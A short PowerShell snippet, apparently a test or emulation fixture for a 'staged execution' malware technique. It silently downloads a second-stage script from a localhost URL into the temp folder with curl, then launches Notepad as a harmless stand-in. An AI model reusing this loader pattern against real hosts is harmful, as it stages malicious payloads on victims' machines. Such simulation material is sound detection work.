
<# Staged execution #> $TargetUrl = "https://127.0.0.1/stage2.ps1"; $DownloadPath = "$env:TEMP\stage1.bin"; curl.exe -s -L -o $DownloadPath $TargetUrl; Start-Process -FilePath "notepad.exe" -ErrorAction SilentlyContinue; $StageMarker = "stage-9"
